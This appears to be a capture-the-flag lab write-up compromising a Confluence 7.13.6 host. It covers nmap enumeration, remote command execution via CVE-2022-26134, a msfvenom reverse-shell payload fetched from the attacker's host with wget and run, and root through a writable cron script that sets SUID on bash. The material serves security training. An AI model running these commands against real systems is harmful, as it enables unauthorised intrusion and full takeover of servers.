## INFORMATION GATHERING
```bash
# IP ADDRESS
192.168.121.41

# HOSTNAME                                 // Found post initial foothold
flu
# OPERATING SYSTEM                         // Found post initial foothold
confluence@flu:/tmp$ cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=23.04
DISTRIB_CODENAME=lunar
DISTRIB_DESCRIPTION="Ubuntu 23.04"
PRETTY_NAME="Ubuntu 23.04"
NAME="Ubuntu"
VERSION_ID="23.04"
VERSION="23.04 (Lunar Lobster)"
VERSION_CODENAME=lunar

# CREDENTIALS  

```
## OPEN PORTS DETAILS
```bash
22/tcp   open  ssh           syn-ack ttl 61 OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
8090/tcp open  opsmessaging? syn-ack ttl 61
8091/tcp open  jamlink?      syn-ack ttl 61
```
# ENUMERATION
## PORT 8090
```bash
sudo whatweb $url | sed 's/,/\n/g'

http://192.168.121.41:8090 [302 Found] Confluence
 Cookies[JSESSIONID]
 Country[RESERVED][ZZ]
 HttpOnly[JSESSIONID]
 IP[192.168.121.41]
 Java
 RedirectLocation[/login.action?os_destination=%2Findex.action&permissionViolation=true]
 UncommonHeaders[x-confluence-request-time
x-content-type-options
content-security-policy]
 X-Frame-Options[SAMEORIGIN]
 X-XSS-Protection[1; mode=block]
http://192.168.121.41:8090/login.action?os_destination=%2Findex.action&permissionViolation=true [200 OK] Confluence
 Cookies[JSESSIONID]
 Country[RESERVED][ZZ]
 HTML5
 HttpOnly[JSESSIONID]
 IP[192.168.121.41]
 probably Index-Of
 Java
 OpenSearch[/opensearch/osd.action]
 PasswordField[os_password]
 Script[context
resource
text/javascript
text/x-template]
 Title[Log In - Confluence]
 UncommonHeaders[x-confluence-request-time
x-content-type-options
content-security-policy
x-accel-buffering]
 X-Frame-Options[SAMEORIGIN]
 X-UA-Compatible[IE=EDGE]
 X-XSS-Protection[1; mode=block]

- http://192.168.121.41:8090/login.action?os_destination=%2Findex.action&permissionViolation=true
- Found Atlassian Confluence 7.13.6

- Exploit
https://github.com/nxtexploit/CVE-2022-26134
```
## INITIAL FOOTHOLD
```bash
# Exploit
https://github.com/nxtexploit/CVE-2022-26134

sudo python3 CVE-2022-26134.py http://192.168.121.41:8090 id                               
Confluence target version: 7.13.6
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence) 

# Proper shell
sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.221 LPORT=8091 -f elf -o shell.elf

sudo python3 -m http.server 8090                                                                          
Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/) ...
192.168.121.41 - - [03/Dec/2024 22:55:10] "GET /shell.elf HTTP/1.1" 200 -

sudo python3 CVE-2022-26134.py http://192.168.121.41:8090 'wget 192.168.45.221:8090/shell.elf -O /tmp/shell'
sudo python3 CVE-2022-26134.py http://192.168.121.41:8090 'chmod 777 /tmp/shell'
sudo python3 CVE-2022-26134.py http://192.168.121.41:8090 '/tmp/shell'

sudo nc -nvlp 8091
listening on [any] 8091 ...
connect to [192.168.45.221] from (UNKNOWN) [192.168.121.41] 35132
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)

```
## PRIVILEGE ESCALATION
```bash
# pspy
- Running pspy found
- 2024/12/03 17:47:01 CMD: UID=0     PID=24093  | /bin/sh -c /opt/log-backup.sh                 
- Script run as uid 0 which is root

-rwxr-xr-x 1 confluence confluence 23 Dec  3 17:47 /opt/log-backup.sh
- /opt/log-backup.sh is writable by confluence user

echo "chmod +s /usr/bin/bash" > /opt/log-backup.sh

confluence@flu:/tmp$ ls -la /usr/bin/bash
-rwsr-sr-x 1 root root 1437832 Jan  7  2023 /usr/bin/bash

confluence@flu:/tmp$ /usr/bin/bash -p
bash-5.2# id
uid=1001(confluence) gid=1001(confluence) euid=0(root) egid=0(root) groups=0(root),1001(confluence)
bash-5.2# whoami
root

# root
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.94SVN scan initiated Tue Dec  3 22:36:25 2024 as: /usr/lib/nmap/nmap -p- -sC -sV -vv -oN nmap/scan-script-version 192.168.121.41
Nmap scan report for 192.168.121.41
Host is up, received reset ttl 61 (0.043s latency).
Scanned at 2024-12-03 22:36:27 IST for 134s
Not shown: 65532 closed tcp ports (reset)

PORT     STATE SERVICE       REASON         VERSION
22/tcp   open  ssh           syn-ack ttl 61 OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 02:79:64:84:da:12:97:23:77:8a:3a:60:20:96:ee:cf (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEXrRUno9oC8lTzQc4mkRYkhVE1WFraJqALzhn+4EmH4j57s4WioLYYYESpMPsdluWAXJreN+LVlUL/5UteMBbI=
|   256 dd:49:a3:89:d7:57:ca:92:f0:6c:fe:59:a6:24:cc:87 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIITU00dnwzhT+PFW6y7qRlFYCQ0UzFakp4R4NIq5TWiS

8090/tcp open  opsmessaging? syn-ack ttl 61
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 302 
|     Cache-Control: no-store
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     X-Confluence-Request-Time: 1733245623510
|     Set-Cookie: JSESSIONID=D518E2E9A0A5F7BFDA68A6A59D3D9A57; Path=/; HttpOnly
|     X-XSS-Protection: 1; mode=block
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: SAMEORIGIN
|     Content-Security-Policy: frame-ancestors 'self'
|     Location: http://localhost:8090/login.action?os_destination=%2Findex.action&permissionViolation=true
|     Content-Type: text/html;charset=UTF-8
|     Content-Length: 0
|     Date: Tue, 03 Dec 2024 17:07:03 GMT
|     Connection: close
|   HTTPOptions: 
|     HTTP/1.1 200 
|     MS-Author-Via: DAV
|     Content-Type: text/html;charset=UTF-8
|     Content-Length: 0
|     Date: Tue, 03 Dec 2024 17:07:03 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1924
|     Date: Tue, 03 Dec 2024 17:07:03 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol [RTSP&#47;1.00x0d0x0a0x0d0x0a...]</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid

8091/tcp open  jamlink?      syn-ack ttl 61
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 204 No Content
|     Server: Aleph/0.4.6
|     Date: Tue, 03 Dec 2024 17:07:38 GMT
|     Connection: Close
|   GetRequest: 
|     HTTP/1.1 204 No Content
|     Server: Aleph/0.4.6
|     Date: Tue, 03 Dec 2024 17:07:08 GMT
|     Connection: Close
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Max-Age: 31536000
|     Access-Control-Allow-Methods: OPTIONS, GET, PUT, POST
|     Server: Aleph/0.4.6
|     Date: Tue, 03 Dec 2024 17:07:08 GMT
|     Connection: Close
|     content-length: 0
|   Help, Kerberos, LDAPSearchReq, LPDString, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 414 Request-URI Too Long
|     text is empty (possibly HTTP/0.9)
|   RTSPRequest: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Max-Age: 31536000
|     Access-Control-Allow-Methods: OPTIONS, GET, PUT, POST
|     Server: Aleph/0.4.6
|     Date: Tue, 03 Dec 2024 17:07:08 GMT
|     Connection: Keep-Alive
|     content-length: 0
|   SIPOptions: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Max-Age: 31536000
|     Access-Control-Allow-Methods: OPTIONS, GET, PUT, POST
|     Server: Aleph/0.4.6
|     Date: Tue, 03 Dec 2024 17:07:43 GMT
|     Connection: Keep-Alive
|_    content-length: 0


2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8090-TCP:V=7.94SVN%I=7%D=12/3%Time=674F3AB9%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,22F,"HTTP/1\.1\x20302\x20\r\nCache-Control:\x20no-store\r\n
SF:Expires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nX-Confluenc
SF:e-Request-Time:\x201733245623510\r\nSet-Cookie:\x20JSESSIONID=D518E2E9A
SF:0A5F7BFDA68A6A59D3D9A57;\x20Path=/;\x20HttpOnly\r\nX-XSS-Protection:\x2
SF:01;\x20mode=block\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Opti
SF:ons:\x20SAMEORIGIN\r\nContent-Security-Policy:\x20frame-ancestors\x20's
SF:elf'\r\nLocation:\x20http://localhost:8090/login\.action\?os_destinatio
SF:n=%2Findex\.action&permissionViolation=true\r\nContent-Type:\x20text/ht
SF:ml;charset=UTF-8\r\nContent-Length:\x200\r\nDate:\x20Tue,\x2003\x20Dec\
SF:x202024\x2017:07:03\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(HTTPOpti
SF:ons,97,"HTTP/1\.1\x20200\x20\r\nMS-Author-Via:\x20DAV\r\nContent-Type:\
SF:x20text/html;charset=UTF-8\r\nContent-Length:\x200\r\nDate:\x20Tue,\x20
SF:03\x20Dec\x202024\x2017:07:03\x20GMT\r\nConnection:\x20close\r\n\r\n")%
SF:r(RTSPRequest,820,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;c
SF:harset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x201924\r\nD
SF:ate:\x20Tue,\x2003\x20Dec\x202024\x2017:07:03\x20GMT\r\nConnection:\x20
SF:close\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x
SF:20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20type
SF:=\"text/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1,\x20
SF:h2,\x20h3,\x20b\x20{color:white;background-color:#525D76;}\x20h1\x20{fo
SF:nt-size:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14px;}\x2
SF:0p\x20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{height:1px
SF:;background-color:#525D76;border:none;}</style></head><body><h1>HTTP\x2
SF:0Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1><hr\x20class=\"lin
SF:e\"\x20/><p><b>Type</b>\x20Exception\x20Report</p><p><b>Message</b>\x20
SF:Invalid\x20character\x20found\x20in\x20the\x20HTTP\x20protocol\x20\[RTS
SF:P&#47;1\.00x0d0x0a0x0d0x0a\.\.\.\]</p><p><b>Description</b>\x20The\x20s
SF:erver\x20cannot\x20or\x20will\x20not\x20process\x20the\x20request\x20du
SF:e\x20to\x20something\x20that\x20is\x20perceived\x20to\x20be\x20a\x20cli
SF:ent\x20error\x20\(e\.g\.,\x20malformed\x20request\x20syntax,\x20invalid
SF:\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8091-TCP:V=7.94SVN%I=7%D=12/3%Time=674F3ABE%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,68,"HTTP/1\.1\x20204\x20No\x20Content\r\nServer:\x20Aleph/0
SF:\.4\.6\r\nDate:\x20Tue,\x2003\x20Dec\x202024\x2017:07:08\x20GMT\r\nConn
SF:ection:\x20Close\r\n\r\n")%r(HTTPOptions,EC,"HTTP/1\.1\x20200\x20OK\r\n
SF:Access-Control-Allow-Origin:\x20\*\r\nAccess-Control-Max-Age:\x20315360
SF:00\r\nAccess-Control-Allow-Methods:\x20OPTIONS,\x20GET,\x20PUT,\x20POST
SF:\r\nServer:\x20Aleph/0\.4\.6\r\nDate:\x20Tue,\x2003\x20Dec\x202024\x201
SF:7:07:08\x20GMT\r\nConnection:\x20Close\r\ncontent-length:\x200\r\n\r\n"
SF:)%r(RTSPRequest,F1,"HTTP/1\.1\x20200\x20OK\r\nAccess-Control-Allow-Orig
SF:in:\x20\*\r\nAccess-Control-Max-Age:\x2031536000\r\nAccess-Control-Allo
SF:w-Methods:\x20OPTIONS,\x20GET,\x20PUT,\x20POST\r\nServer:\x20Aleph/0\.4
SF:\.6\r\nDate:\x20Tue,\x2003\x20Dec\x202024\x2017:07:08\x20GMT\r\nConnect
SF:ion:\x20Keep-Alive\r\ncontent-length:\x200\r\n\r\n")%r(Help,46,"HTTP/1\
SF:.1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty\x20\
SF:(possibly\x20HTTP/0\.9\)")%r(SSLSessionReq,46,"HTTP/1\.1\x20414\x20Requ
SF:est-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty\x20\(possibly\x20HTTP
SF:/0\.9\)")%r(TerminalServerCookie,46,"HTTP/1\.1\x20414\x20Request-URI\x2
SF:0Too\x20Long\r\n\r\ntext\x20is\x20empty\x20\(possibly\x20HTTP/0\.9\)")%
SF:r(TLSSessionReq,46,"HTTP/1\.1\x20414\x20Request-URI\x20Too\x20Long\r\n\
SF:r\ntext\x20is\x20empty\x20\(possibly\x20HTTP/0\.9\)")%r(Kerberos,46,"HT
SF:TP/1\.1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty
SF:\x20\(possibly\x20HTTP/0\.9\)")%r(FourOhFourRequest,68,"HTTP/1\.1\x2020
SF:4\x20No\x20Content\r\nServer:\x20Aleph/0\.4\.6\r\nDate:\x20Tue,\x2003\x
SF:20Dec\x202024\x2017:07:38\x20GMT\r\nConnection:\x20Close\r\n\r\n")%r(LP
SF:DString,46,"HTTP/1\.1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\
SF:x20is\x20empty\x20\(possibly\x20HTTP/0\.9\)")%r(LDAPSearchReq,46,"HTTP/
SF:1\.1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty\x2
SF:0\(possibly\x20HTTP/0\.9\)")%r(SIPOptions,F1,"HTTP/1\.1\x20200\x20OK\r\
SF:nAccess-Control-Allow-Origin:\x20\*\r\nAccess-Control-Max-Age:\x2031536
SF:000\r\nAccess-Control-Allow-Methods:\x20OPTIONS,\x20GET,\x20PUT,\x20POS
SF:T\r\nServer:\x20Aleph/0\.4\.6\r\nDate:\x20Tue,\x2003\x20Dec\x202024\x20
SF:17:07:43\x20GMT\r\nConnection:\x20Keep-Alive\r\ncontent-length:\x200\r\
SF:n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec  3 22:38:41 2024 -- 1 IP address (1 host up) scanned in 136.33 seconds

```

